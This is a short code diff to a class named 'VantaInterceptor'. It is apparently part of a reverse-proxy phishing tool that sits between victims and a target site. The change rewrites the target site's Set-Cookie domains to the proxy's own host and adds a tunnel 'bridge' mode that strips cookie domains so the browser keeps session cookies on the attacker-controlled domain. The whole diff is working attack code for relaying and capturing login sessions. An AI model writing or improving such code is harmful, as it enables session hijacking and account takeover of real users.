@@ -359,10 +359,23 @@ class VantaInterceptor:
         try:
             ph_host = getattr(flow, "metadata", {}).get("v_ph_host")
             tgt_host = getattr(flow, "metadata", {}).get("v_tgt_host")
-            if ph_host and tgt_host:
+            is_bridge = getattr(flow, "metadata", {}).get("v_bridge", False)
+
+            if ph_host:
                 for name, (value, attrs) in list(flow.response.cookies.items()):
                     dom = attrs.get("domain")
-                    if dom and (dom == tgt_host or dom.endswith("." + tgt_host)):
+                    
+                    # If we are using bridges (single domain mode), strip domain to make it host-only
+                    if is_bridge:
+                        if "domain" in attrs:
+                            del attrs["domain"]
+                        # Also fix SameSite/Secure if needed for non-secure contexts (though localhost.run is https)
+                        if "samesite" in attrs and attrs["samesite"].lower() == "none":
+                            attrs["secure"] = True # Must be secure for None
+                        flow.response.cookies[name] = (value, attrs)
+                    
+                    # Normal subdomain mode
+                    elif tgt_host and dom and (dom == tgt_host or dom.endswith("." + tgt_host)):
                         attrs["domain"] = ph_host
                         flow.response.cookies[name] = (value, attrs)
         except Exception:
